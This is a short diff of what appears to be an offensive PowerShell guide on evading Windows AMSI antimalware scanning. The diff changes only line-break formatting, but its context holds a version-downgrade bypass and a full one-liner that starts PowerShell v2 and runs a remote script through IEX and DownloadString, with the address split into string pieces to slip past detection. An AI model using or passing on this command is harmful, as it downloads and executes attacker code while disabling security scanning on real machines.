@@ -764,7 +764,7 @@ Here we can view the all process of encoding/decoding in powershell console
 
 ![enigma0x3 - AMSI Bypass](http://i.cubeupload.com/DRUo9T.png)
 
-<br />
+---
 
 - Bypass or Avoid AMSI by **version Downgrade** <br />
 
@@ -772,7 +772,7 @@ Here we can view the all process of encoding/decoding in powershell console
       If .Net 3.0 is available on a target Windows 10 machine (which is not default) PowerShell
       v2 can be started  with the -Version option.
 
-<br />
+<br /><br />
 
       powershell.exe -version 2; IEX (New-Object Net.WebClient).DownloadString('ht'+'tp:'+'//19'+'2.16'+'8.1.71/Hello.ps1')
       
